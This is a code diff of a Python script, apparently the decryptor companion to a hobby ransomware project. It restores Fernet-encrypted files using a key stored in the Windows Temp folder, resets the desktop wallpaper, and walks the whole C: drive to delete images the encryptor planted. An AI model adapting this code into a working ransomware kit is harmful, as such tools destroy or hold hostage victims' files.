@@ -1,10 +1,10 @@
 from cryptography.fernet import Fernet 
-import os , threading , platform
+import os , threading , platform , ctypes
 
 #Aca casi no hay diferencia con el encriptador solo el hecho de que aca programe para que borre las fotos que previamente cree
 
-def retornar_key(): 
-        return open("C:\\Windows\\Temp\\key.key" , "rb").read()
+def retornar_key():
+    return open("C:\\Windows\\Temp\\key.key" , "rb").read()
         
 
     
@@ -18,7 +18,7 @@ def desencryptador(path , key):
     with open(path , "wb") as op:  
         op.write(Archivos_desencriptado)
             
-def Rutas_a_encriptar(ruta , llave):
+def Rutas_a_desencriptar(ruta , llave):
     Directorios_desencriptar = list()
     
     Directorios_desencriptar.append(ruta)
@@ -41,21 +41,21 @@ def Rutas_a_encriptar(ruta , llave):
             A = os.listdir(a)
             for b in A:
                 if os.path.isdir(f"{a}\\{b}"):
-                    Directorios_desencriptar.append(f"{a}\\{b}")
-                    print(f"{a}\\{b}")    
+                    Directorios_desencriptar.append(f"{a}\\{b}")    
                 else:
                     desencryptador(f"{a}\\{b}" , llave)
         except Exception:
             pass
 
 def delete_photos():
-    # Se verifica el os
-    if platform.system() == "Windows": 
-        ruta = "C:\\"
-    elif platform.system() == "Linux":
-        ruta = "/"
-    else:
-        print("Chupala usario de mac")
+    
+    try:
+        Ruta_wallpaper = "C:\\Windows\\Web\\Wallpaper\\Nature\\img3.jpg"
+        ctypes.windll.user32.SystemParametersInfoW(20 , 0 , Ruta_wallpaper , 0)
+    except Exception:
+        pass
+        
+    ruta = "C:\\"
     
     Ruta_completa = list()
     Ruta_completa.append(ruta)
@@ -84,14 +84,13 @@ def main():
     except Exception:
         pass
         
-    DEFAULT_PATH = os.getenv("userprofile")
+    DEFAULT_PATH = os.getenv("userprofile") + "\\Desktop\\Pruebas"
     
     llave = retornar_key()
-    Rutas = Rutas_a_encriptar(DEFAULT_PATH , llave)
+    Rutas = Rutas_a_desencriptar(DEFAULT_PATH , llave)
     
 if __name__ == "__main__":
     
-    Usuario_root = os.getenv("userprofile")
     
     Proceso1 = threading.Thread(target= main())
     Proceso2 = threading.Thread(target= delete_photos())
